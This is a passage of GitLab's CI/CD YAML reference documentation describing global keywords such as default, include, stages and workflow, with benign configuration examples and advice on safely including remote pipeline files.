| [`extends`](https://docs.gitlab.com/ci/yaml/#extends) | Configuration entries that this job inherits from. |
| [`identity`](https://docs.gitlab.com/ci/yaml/#identity) | Authenticate with third party services using identity federation. |
| [`image`](https://docs.gitlab.com/ci/yaml/#image) | Use Docker images. |
| [`inherit`](https://docs.gitlab.com/ci/yaml/#inherit) | Select which global defaults all jobs inherit. |
| [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible) | Defines if a job can be canceled when made redundant by a newer run. |
| [`manual_confirmation`](https://docs.gitlab.com/ci/yaml/#manual_confirmation) | Define a custom confirmation message for a manual job. |
| [`needs`](https://docs.gitlab.com/ci/yaml/#needs) | Execute jobs earlier than the stage ordering. |
| [`pages`](https://docs.gitlab.com/ci/yaml/#pages) | Upload the result of a job to use with GitLab Pages. |
| [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel) | How many instances of a job should be run in parallel. |
| [`release`](https://docs.gitlab.com/ci/yaml/#release) | Instructs the runner to generate a [release](https://docs.gitlab.com/user/project/releases/) object. |
| [`resource_group`](https://docs.gitlab.com/ci/yaml/#resource_group) | Limit job concurrency. |
| [`retry`](https://docs.gitlab.com/ci/yaml/#retry) | When and how many times a job can be auto-retried in case of a failure. |
| [`rules`](https://docs.gitlab.com/ci/yaml/#rules) | List of conditions to evaluate and determine selected attributes of a job, and whether or not it’s created. |
| [`script`](https://docs.gitlab.com/ci/yaml/#script) | Shell script that is executed by a runner. |
| [`run`](https://docs.gitlab.com/ci/yaml/#run) | Run configuration that is executed by a runner. |
| [`secrets`](https://docs.gitlab.com/ci/yaml/#secrets) | The CI/CD secrets the job needs. |
| [`services`](https://docs.gitlab.com/ci/yaml/#services) | Use Docker services images. |
| [`stage`](https://docs.gitlab.com/ci/yaml/#stage) | Defines a job stage. |
| [`tags`](https://docs.gitlab.com/ci/yaml/#tags) | List of tags that are used to select a runner. |
| [`timeout`](https://docs.gitlab.com/ci/yaml/#timeout) | Define a custom job-level timeout that takes precedence over the project-wide setting. |
| [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) | Defines a downstream pipeline trigger. |
| [`when`](https://docs.gitlab.com/ci/yaml/#when) | When to run job. |





|
|

- [CI/CD variables](https://docs.gitlab.com/ci/yaml/#variables)




| Keyword | Description |
| --- | --- |
| [Default `variables`](https://docs.gitlab.com/ci/yaml/#default-variables) | Define default CI/CD variables for all jobs in the pipeline. |
| [Job `variables`](https://docs.gitlab.com/ci/yaml/#job-variables) | Define CI/CD variables for individual jobs. |





|
|

- [Deprecated keywords](https://docs.gitlab.com/ci/yaml/deprecated_keywords/) that are no longer recommended for use.


## Global keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#global-keywords "Permalink")

Some keywords are not defined in a job. These keywords control pipeline behavior
or import additional pipeline configuration.

### `default` [Permalink](https://docs.gitlab.com/ci/yaml/\#default "Permalink")

History

- Support for `id_tokens` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/419750) in GitLab 16.4.

You can set global defaults for some keywords. Each default keyword is copied to every job
that doesn’t already have it defined. If the job already has a keyword defined, that default
is not used.

**Keyword type**: Global keyword.

**Supported values**: These keywords can have custom defaults:

- [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script)
- [`artifacts`](https://docs.gitlab.com/ci/yaml/#artifacts)
- [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script)
- [`cache`](https://docs.gitlab.com/ci/yaml/#cache)
- [`hooks`](https://docs.gitlab.com/ci/yaml/#hooks)
- [`id_tokens`](https://docs.gitlab.com/ci/yaml/#id_tokens)
- [`image`](https://docs.gitlab.com/ci/yaml/#image)
- [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible)
- [`retry`](https://docs.gitlab.com/ci/yaml/#retry)
- [`services`](https://docs.gitlab.com/ci/yaml/#services)
- [`tags`](https://docs.gitlab.com/ci/yaml/#tags)
- [`timeout`](https://docs.gitlab.com/ci/yaml/#timeout), though due to [issue 213634](https://gitlab.com/gitlab-org/gitlab/-/issues/213634)
this keyword has no effect.

**Example of `default`**:

YAML Copy to clipboard

```yaml
default:
  image: ruby:3.0
  retry: 2

rspec:
  script: bundle exec rspec

rspec 2.7:
  image: ruby:2.7
  script: bundle exec rspec
```

In this example:

- `image: ruby:3.0` and `retry: 2` are the default keywords for all jobs in the pipeline.
- The `rspec` job does not have `image` or `retry` defined, so it uses the defaults of
`image: ruby:3.0` and `retry: 2`.
- The `rspec 2.7` job does not have `retry` defined, but it does have `image` explicitly defined.
It uses the default `retry: 2`, but ignores the default `image` and uses the `image: ruby:2.7`
defined in the job.

**Additional details**:

- Control inheritance of default keywords in jobs with [`inherit:default`](https://docs.gitlab.com/ci/yaml/#inheritdefault).
- Global defaults are not passed to [downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/),
which run independently of the upstream pipeline that triggered the downstream pipeline.

### `include` [Permalink](https://docs.gitlab.com/ci/yaml/\#include "Permalink")

Use `include` to include external YAML files in your CI/CD configuration.
You can split one long `.gitlab-ci.yml` file into multiple files to increase readability,
or reduce duplication of the same configuration in multiple places.

You can also store template files in a central repository and include them in projects.

The `include` files are:

- Merged with those in the `.gitlab-ci.yml` file.
- Always evaluated first and then merged with the content of the `.gitlab-ci.yml` file,
regardless of the position of the `include` keyword.

The time limit to resolve all files is 30 seconds.

**Keyword type**: Global keyword.

**Supported values**: The `include` subkeys:

- [`include:component`](https://docs.gitlab.com/ci/yaml/#includecomponent)
- [`include:local`](https://docs.gitlab.com/ci/yaml/#includelocal)
- [`include:project`](https://docs.gitlab.com/ci/yaml/#includeproject)
- [`include:remote`](https://docs.gitlab.com/ci/yaml/#includeremote)
- [`include:template`](https://docs.gitlab.com/ci/yaml/#includetemplate)

And optionally:

- [`include:inputs`](https://docs.gitlab.com/ci/yaml/#includeinputs)
- [`include:rules`](https://docs.gitlab.com/ci/yaml/#includerules)
- [`include:integrity`](https://docs.gitlab.com/ci/yaml/#includeintegrity)

**Additional details**:

- Only [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include) can be used
with `include` keywords.
- Use merging to customize and override included CI/CD configurations with local
- You can override included configuration by having the same job name or global keyword
in the `.gitlab-ci.yml` file. The two configurations are merged together, and the
configuration in the `.gitlab-ci.yml` file takes precedence over the included configuration.
- If you rerun a:
  - Job, the `include` files are not fetched again. All jobs in a pipeline use the configuration
    fetched when the pipeline was created. Any changes to the source `include` files
    do not affect job reruns.
  - Pipeline, the `include` files are fetched again. If they changed after the last
    pipeline run, the new pipeline uses the changed configuration.
- You can have up to 150 includes per pipeline by default, including [nested](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes). Additionally:
  - In [GitLab 16.0 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/207270) users on GitLab Self-Managed can
    change the [maximum includes](https://docs.gitlab.com/administration/settings/continuous_integration/#set-maximum-includes) value.
  - In [GitLab 15.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/367150) you can have up to 150 includes.
    In nested includes, the same file can be included multiple times, but duplicated includes
    count towards the limit.
  - From [GitLab 14.9 to GitLab 15.9](https://gitlab.com/gitlab-org/gitlab/-/issues/28987), you can have up to 100 includes.
    The same file can be included multiple times in nested includes, but duplicates are ignored.

#### `include:component` [Permalink](https://docs.gitlab.com/ci/yaml/\#includecomponent "Permalink")

Use `include:component` to add a [CI/CD component](https://docs.gitlab.com/ci/components/) to the
pipeline configuration.

**Keyword type**: Global keyword.

**Supported values**: The full address of the CI/CD component, formatted as
`<fully-qualified-domain-name>/<project-path>/<component-name>@<specific-version>`.

**Example of `include:component`**:

YAML Copy to clipboard

```yaml
include:
  - component: $CI_SERVER_FQDN/my-org/security-components/secret-detection@1.0
```

**Related topics**:

- [Use a CI/CD component](https://docs.gitlab.com/ci/components/#use-a-component).

#### `include:local` [Permalink](https://docs.gitlab.com/ci/yaml/\#includelocal "Permalink")

Use `include:local` to include a file that is in the same repository and branch as the configuration file containing the `include` keyword.
Use `include:local` instead of symbolic links.

**Keyword type**: Global keyword.

**Supported values**:

A full path relative to the root directory ( `/`):

- The YAML file must have the extension `.yml` or `.yaml`.
- You can [use `*` and `**` wildcards in the file path](https://docs.gitlab.com/ci/yaml/includes/#use-includelocal-with-wildcard-file-paths).
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:local`**:

YAML Copy to clipboard

```yaml
include:
  - local: '/templates/.gitlab-ci-template.yml'
```

You can also use shorter syntax to define the path:

YAML Copy to clipboard

```yaml
include: '.gitlab-ci-production.yml'
```

**Additional details**:

- The `.gitlab-ci.yml` file and the local file must be on the same branch.
- You can’t include local files through Git submodules paths.
- `include` configuration is always evaluated based on the location of the file
containing the `include` keyword, not the project running the pipeline. If a
[nested `include`](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) is in a configuration file
in a different project, `include: local` checks that other project for the file.

#### `include:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeproject "Permalink")

To include files from another private project on the same GitLab instance,
use `include:project` and `include:file`.

**Keyword type**: Global keyword.

**Supported values**:

- `include:project`: The full GitLab project path.
- `include:file` A full file path, or array of file paths, relative to the root directory ( `/`).
The YAML files must have the `.yml` or `.yaml` extension.
- `include:ref`: Optional. The ref to retrieve the file from. Defaults to the `HEAD` of the project
when not specified.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:project`**:

YAML Copy to clipboard

```yaml
include:
  - project: 'my-group/my-project'
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-subgroup/my-project-2'
    file:
      - '/templates/.builds.yml'
      - '/templates/.tests.yml'
```

You can also specify a `ref`:

YAML Copy to clipboard

```yaml
include:
  - project: 'my-group/my-project'
    ref: main                                      # Git branch
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-project'
    ref: v1.0.0                                    # Git Tag
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-project'
    ref: 787123b47f14b552955ca2786bc9542ae66fee5b  # Git SHA
    file: '/templates/.gitlab-ci-template.yml'
```

**Additional details**:

- `include` configuration is always evaluated based on the location of the file
containing the `include` keyword, not the project running the pipeline. If a
[nested `include`](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) is in a configuration file
in a different project, `include: local` checks that other project for the file.
- When the pipeline starts, the `.gitlab-ci.yml` file configuration included by all methods is evaluated.
The configuration is a snapshot in time and persists in the database. GitLab does not reflect any changes to
the referenced `.gitlab-ci.yml` file configuration until the next pipeline starts.
- When you include a YAML file from another private project, the user running the pipeline
must be a member of both projects and have the appropriate permissions to run pipelines.
A `not found or access denied` error may be displayed if the user does not have access to any of the included files.
- Be careful when including another project’s CI/CD configuration file. No pipelines or notifications trigger when CI/CD configuration files change.
From a security perspective, this is similar to pulling a third-party dependency. For the `ref`, consider:
  - Using a specific SHA hash, which should be the most stable option. Use the
    full 40-character SHA hash to ensure the desired commit is referenced, because
    using a short SHA hash for the `ref` might be ambiguous.
  - Applying both [protected branch](https://docs.gitlab.com/user/project/repository/branches/protected/) and [protected tag](https://docs.gitlab.com/user/project/protected_tags/#prevent-tag-creation-with-the-same-name-as-branches) rules to
    the `ref` in the other project. Protected tags and branches are more likely to pass through change management before changing.

#### `include:remote` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeremote "Permalink")

Use `include:remote` with a full URL to include a file from a different location.

**Keyword type**: Global keyword.

**Supported values**:

A public URL accessible by an HTTP/HTTPS `GET` request:

- Authentication with the remote URL is not supported.
- The YAML file must have the extension `.yml` or `.yaml`.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:remote`**:

YAML Copy to clipboard

```yaml
include:
  - remote: 'https://gitlab.com/example-project/-/raw/main/.gitlab-ci.yml'
```

**Additional details**:

- All [nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) are executed without context as a public user,
so you can only include public projects or templates. No variables are available in the `include` section of nested includes.
- Be careful when including another project’s CI/CD configuration file. No pipelines or notifications trigger
when the other project’s files change. From a security perspective, this is similar to
pulling a third-party dependency. To verify the integrity of the included file, consider using the [`integrity`](https://docs.gitlab.com/ci/yaml/#includeintegrity) keyword.
If you link to another GitLab project you own, consider the use of both
[protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/) and [protected tags](https://docs.gitlab.com/user/project/protected_tags/#prevent-tag-creation-with-the-same-name-as-branches)
to enforce change management rules.

#### `include:template` [Permalink](https://docs.gitlab.com/ci/yaml/\#includetemplate "Permalink")

Use `include:template` to include [`.gitlab-ci.yml` templates](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).

**Keyword type**: Global keyword.

**Supported values**:

A [CI/CD template](https://docs.gitlab.com/ci/examples/#cicd-templates):

- All templates can be viewed in [`lib/gitlab/ci/templates`](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).
Not all templates are designed to be used with `include:template`, so check template
comments before using one.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:template`**:

YAML Copy to clipboard

```yaml
# File sourced from the GitLab template collection
include:
  - template: Auto-DevOps.gitlab-ci.yml
```

Multiple `include:template` files:

YAML Copy to clipboard

```yaml
include:
  - template: Android-Fastlane.gitlab-ci.yml
  - template: Auto-DevOps.gitlab-ci.yml
```

**Additional details**:

- All [nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) are executed without context as a public user,
so you can only include public projects or templates. No variables are available in the `include` section of nested includes.

#### `include:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.
- [Made generally available](https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/134062) in GitLab 17.0.

Use `include:inputs` to set the values for input parameters when the included configuration
uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs) and is added to the pipeline.

**Keyword type**: Global keyword.

**Supported values**: A string, numeric value, or boolean.

**Example of `include:inputs`**:

YAML Copy to clipboard

```yaml
include:
  - local: 'custom_configuration.yml'
    inputs:
      website: "My website"
```

In this example:

- The configuration contained in `custom_configuration.yml` is added to the pipeline,
with a `website` input set to a value of `My website` for the included configuration.

**Additional details**:

- If the included configuration file uses [`spec:inputs:type`](https://docs.gitlab.com/ci/yaml/#specinputstype),
the input value must match the defined type.
- If the included configuration file uses [`spec:inputs:options`](https://docs.gitlab.com/ci/yaml/#specinputsoptions),
the input value must match one of the listed options.

**Related topics**:

- [Set input values when using `include`](https://docs.gitlab.com/ci/inputs/#for-configuration-added-with-include).

#### `include:rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#includerules "Permalink")

You can use [`rules`](https://docs.gitlab.com/ci/yaml/#rules) with `include` to conditionally include other configuration files.

**Keyword type**: Global keyword.

**Supported values**: These `rules` subkeys:

- [`rules:if`](https://docs.gitlab.com/ci/yaml/#rulesif).
- [`rules:exists`](https://docs.gitlab.com/ci/yaml/#rulesexists).
- [`rules:changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges).

Some [CI/CD variables are supported](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:rules`**:

YAML Copy to clipboard

```yaml
include:
  - local: build_jobs.yml
    rules:
      - if: $INCLUDE_BUILDS == "true"

test-job:
  stage: test
  script: echo "This is a test job"
```

In this example, if the `INCLUDE_BUILDS` variable is:

- `true`, the `build_jobs.yml` configuration is included in the pipeline.
- Not `true` or does not exist, the `build_jobs.yml` configuration is not included in the pipeline.

**Related topics**:

- Examples of using `include` with:
  - [`rules:if`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesif).
  - [`rules:changes`](https://docs.gitlab.com/ci/yaml/includes/#include-with-ruleschanges).
  - [`rules:exists`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesexists).

#### `include:integrity` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeintegrity "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/178593) in GitLab 17.9.

Use `integrity` with `include:remote` to specifiy a SHA256 hash of the included remote file.
If `integrity` does not match the actual content, the remote file is not processed
and the pipeline fails.

**Keyword type**: Global keyword.

**Supported values**: Base64-encoded SHA256 hash of the included content.

**Example of `include:integrity`**:

YAML Copy to clipboard

```yaml
include:
  - remote: 'https://gitlab.com/example-project/-/raw/main/.gitlab-ci.yml'
    integrity: 'sha256-L3/GAoKaw0Arw6hDCKeKQlV1QPEgHYxGBHsH4zG1IY8='
```

### `stages` [Permalink](https://docs.gitlab.com/ci/yaml/\#stages "Permalink")

History

- Support for nested array of strings [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/439451) in GitLab 16.9.

Use `stages` to define stages that contain groups of jobs. Use [`stage`](https://docs.gitlab.com/ci/yaml/#stage)
in a job to configure the job to run in a specific stage.

If `stages` is not defined in the `.gitlab-ci.yml` file, the default pipeline stages are:

- [`.pre`](https://docs.gitlab.com/ci/yaml/#stage-pre)
- `build`
- `test`
- `deploy`
- [`.post`](https://docs.gitlab.com/ci/yaml/#stage-post)

The order of the items in `stages` defines the execution order for jobs:

- Jobs in the same stage run in parallel.
- Jobs in the next stage run after the jobs from the previous stage complete successfully.

If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: Global keyword.

**Example of `stages`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy
```

In this example:

1. All jobs in `build` execute in parallel.
2. If all jobs in `build` succeed, the `test` jobs execute in parallel.
3. If all jobs in `test` succeed, the `deploy` jobs execute in parallel.
4. If all jobs in `deploy` succeed, the pipeline is marked as `passed`.

If any job fails, the pipeline is marked as `failed` and jobs in later stages do not
start. Jobs in the current stage are not stopped and continue to run.

**Additional details**:

- If a job does not specify a [`stage`](https://docs.gitlab.com/ci/yaml/#stage), the job is assigned the `test` stage.
- If a stage is defined but no jobs use it, the stage is not visible in the pipeline,
which can help [compliance pipeline configurations](https://docs.gitlab.com/user/compliance/compliance_pipelines/):
  - Stages can be defined in the compliance configuration but remain hidden if not used.
  - The defined stages become visible when developers use them in job definitions.

**Related topics**:

- To make a job start earlier and ignore the stage order, use the [`needs`](https://docs.gitlab.com/ci/yaml/#needs) keyword.

### `workflow` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflow "Permalink")

Use [`workflow`](https://docs.gitlab.com/ci/yaml/workflow/) to control pipeline behavior.

You can use some [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/) in
`workflow` configuration, but not variables that are only defined when jobs start.

**Related topics**:

- [`workflow: rules` examples](https://docs.gitlab.com/ci/yaml/workflow/#workflow-rules-examples)
- [Switch between branch pipelines and merge request pipelines](https://docs.gitlab.com/ci/yaml/workflow/#switch-between-branch-pipelines-and-merge-request-pipelines)

#### `workflow:auto_cancel:on_new_commit` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowauto_cancelon_new_commit "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/412473) in GitLab 16.8 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_workflow_auto_cancel_on_new_commit`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.9.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.10. Feature flag `ci_workflow_auto_cancel_on_new_commit` removed.

Use `workflow:auto_cancel:on_new_commit` to configure the behavior of
the [auto-cancel redundant pipelines](https://docs.gitlab.com/ci/pipelines/settings/#auto-cancel-redundant-pipelines) feature.

**Supported values**:

- `conservative`: Cancel the pipeline, but only if no jobs with `interruptible: false` have started yet. Default when not defined.
- `interruptible`: Cancel only jobs with `interruptible: true`.
- `none`: Do not auto-cancel any jobs.

**Example of `workflow:auto_cancel:on_new_commit`**:

YAML Copy to clipboard

```yaml
workflow:
  auto_cancel:
    on_new_commit: interruptible

job1:
  interruptible: true
  script: sleep 60

job2:
  interruptible: false  # Default when not defined.
  script: sleep 60
```

In this example:

- When a new commit is pushed to a branch, GitLab creates a new pipeline and `job1` and `job2` start.
- If a new commit is pushed to the branch before the jobs complete, only `job1` is canceled.

#### `workflow:auto_cancel:on_job_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowauto_cancelon_job_failure "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/23605) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `auto_cancel_pipeline_on_job_failure`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/433163) in GitLab 16.11. Feature flag `auto_cancel_pipeline_on_job_failure` removed.

Use `workflow:auto_cancel:on_job_failure` to configure which jobs should be canceled as soon as one job fails.

**Supported values**:

- `all`: Cancel the pipeline and all running jobs as soon as one job fails.
- `none`: Do not auto-cancel any jobs.

**Example of `workflow:auto_cancel:on_job_failure`**:

YAML Copy to clipboard

```yaml
stages: [stage_a, stage_b]

workflow:
  auto_cancel:
    on_job_failure: all

job1:
  stage: stage_a
  script: sleep 60

job2:
  stage: stage_a
  script:
    - sleep 30
    - exit 1

job3:
  stage: stage_b
  script:
    - sleep 30
```

In this example, if `job2` fails, `job1` is canceled if it is still running and `job3` does not start.

**Related topics**:

- [Auto-cancel the parent pipeline from a downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#auto-cancel-the-parent-pipeline-from-a-downstream-pipeline)

#### `workflow:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowname "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/372538) in GitLab 15.5 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pipeline_name`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/376095) in GitLab 15.7.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/376095) in GitLab 15.8. Feature flag `pipeline_name` removed.

You can use `name` in `workflow:` to define a name for pipelines.

All pipelines are assigned the defined name. Any leading or trailing spaces in the name are removed.

**Supported values**:

- A string.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Examples of `workflow:name`**:

A simple pipeline name with a predefined variable:

YAML Copy to clipboard

```yaml
workflow:
  name: 'Pipeline for branch: $CI_COMMIT_BRANCH'
```

A configuration with different pipeline names depending on the pipeline conditions:

YAML Copy to clipboard

```yaml
variables:
  PROJECT1_PIPELINE_NAME: 'Default pipeline name'  # A default is not required

workflow:
  name: '$PROJECT1_PIPELINE_NAME'
  rules:
    - if: '$CI_MERGE_REQUEST_LABELS =~ /pipeline:run-in-ruby3/'
      variables:
        PROJECT1_PIPELINE_NAME: 'Ruby 3 pipeline'
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
      variables:
        PROJECT1_PIPELINE_NAME: 'MR pipeline: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME'
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH  # For default branch pipelines, use the default name
```

**Additional details**:

- If the name is an empty string, the pipeline is not assigned a name. A name consisting
of only CI/CD variables could evaluate to an empty string if all the variables are also empty.
- `workflow:rules:variables` become [default variables](https://docs.gitlab.com/ci/yaml/#default-variables) available in all jobs,
including [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) jobs which forward variables to downstream pipelines by default.
If the downstream pipeline uses the same variable, the [variable is overwritten](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
by the upstream variable value. Be sure to either:
  - Use a unique variable name in every project’s pipeline configuration, like `PROJECT1_PIPELINE_NAME`.
  - Use [`inherit:variables`](https://docs.gitlab.com/ci/yaml/#inheritvariables) in the trigger job and list the
    exact variables you want to forward to the downstream pipeline.

#### `workflow:rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrules "Permalink")

The `rules` keyword in `workflow` is similar to [`rules` defined in jobs](https://docs.gitlab.com/ci/yaml/#rules),
but controls whether or not a whole pipeline is created.

When no rules evaluate to true, the pipeline does not run.

**Supported values**: You can use some of the same keywords as job-level [`rules`](https://docs.gitlab.com/ci/yaml/#rules):

- [`rules: if`](https://docs.gitlab.com/ci/yaml/#rulesif).
- [`rules: changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges).
- [`rules: exists`](https://docs.gitlab.com/ci/yaml/#rulesexists).
- [`when`](https://docs.gitlab.com/ci/yaml/#when), can only be `always` or `never` when used with `workflow`.
- [`variables`](https://docs.gitlab.com/ci/yaml/#workflowrulesvariables).

**Example of `workflow:rules`**:

YAML Copy to clipboard

```yaml
workflow:
  rules:
    - if: $CI_COMMIT_TITLE =~ /-draft$/
      when: never
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

In this example, pipelines run if the commit title (first line of the commit message) does not end with `-draft`
and the pipeline is for either:

- A merge request
- The default branch.

**Additional details**:

- If your rules match both branch pipelines (other than the default branch) and merge request pipelines,
[duplicate pipelines](https://docs.gitlab.com/ci/jobs/job_rules/#avoid-duplicate-pipelines) can occur.
- `start_in`, `allow_failure`, and `needs` are not supported in `workflow:rules`,
but do not cause a syntax violation. Though they have no effect, do not use them
in `workflow:rules` as it could cause syntax failures in the future. See
[issue 436473](https://gitlab.com/gitlab-org/gitlab/-/issues/436473) for more details.

**Related topics**:

- [Common `if` clauses for `workflow:rules`](https://docs.gitlab.com/ci/yaml/workflow/#common-if-clauses-for-workflowrules).
- [Use `rules` to run merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#add-jobs-to-merge-request-pipelines).

#### `workflow:rules:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrulesvariables "Permalink")

You can use [`variables`](https://docs.gitlab.com/ci/yaml/#variables) in `workflow:rules` to define variables for
specific pipeline conditions.

When the condition matches, the variable is created and can be used by all jobs
in the pipeline. If the variable is already defined at the top level as a default variable,
the `workflow` variable takes precedence and overrides the default variable.

**Keyword type**: Global keyword.

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`).
- The value must be a string.

**Example of `workflow:rules:variables`**:

YAML Copy to clipboard

```yaml
variables:
  DEPLOY_VARIABLE: "default-deploy"

workflow:
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      variables:
        DEPLOY_VARIABLE: "deploy-production"  # Override globally-defined DEPLOY_VARIABLE
    - if: $CI_COMMIT_BRANCH =~ /feature/
      variables:
        IS_A_FEATURE: "true"                  # Define a new variable.
    - if: $CI_COMMIT_BRANCH                   # Run the pipeline in other cases

job1:
  variables:
    DEPLOY_VARIABLE: "job1-default-deploy"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      variables:                                   # Override DEPLOY_VARIABLE defined
        DEPLOY_VARIABLE: "job1-deploy-production"  # at the job level.
    - when: on_success                             # Run the job in other cases
  script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"

job2:
  script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"
```

When the branch is the default branch:

- job1’s `DEPLOY_VARIABLE` is `job1-deploy-production`.
- job2’s `DEPLOY_VARIABLE` is `deploy-production`.

When the branch is `feature`:

- job1’s `DEPLOY_VARIABLE` is `job1-default-deploy`, and `IS_A_FEATURE` is `true`.
- job2’s `DEPLOY_VARIABLE` is `default-deploy`, and `IS_A_FEATURE` is `true`.

When the branch is something else:

- job1’s `DEPLOY_VARIABLE` is `job1-default-deploy`.
- job2’s `DEPLOY_VARIABLE` is `default-deploy`.

**Additional details**:

- `workflow:rules:variables` become [default variables](https://docs.gitlab.com/ci/yaml/#variables) available in all jobs,
including [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) jobs which forward variables to downstream pipelines by default.
If the downstream pipeline uses the same variable, the [variable is overwritten](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
by the upstream variable value. Be sure to either:
  - Use unique variable names in every project’s pipeline configuration, like `PROJECT1_VARIABLE_NAME`.
  - Use [`inherit:variables`](https://docs.gitlab.com/ci/yaml/#inheritvariables) in the trigger job and list the
    exact variables you want to forward to the downstream pipeline.

#### `workflow:rules:auto_cancel` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrulesauto_cancel "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/436467) in GitLab 16.8 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_workflow_auto_cancel_on_new_commit`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.9.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.10. Feature flag `ci_workflow_auto_cancel_on_new_commit` removed.
- `on_job_failure` option for `workflow:rules` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/23605) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `auto_cancel_pipeline_on_job_failure`. Disabled by default.
- `on_job_failure` option for `workflow:rules` [generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/433163) in GitLab 16.11. Feature flag `auto_cancel_pipeline_on_job_failure` removed.

Use `workflow:rules:auto_cancel` to configure the behavior of
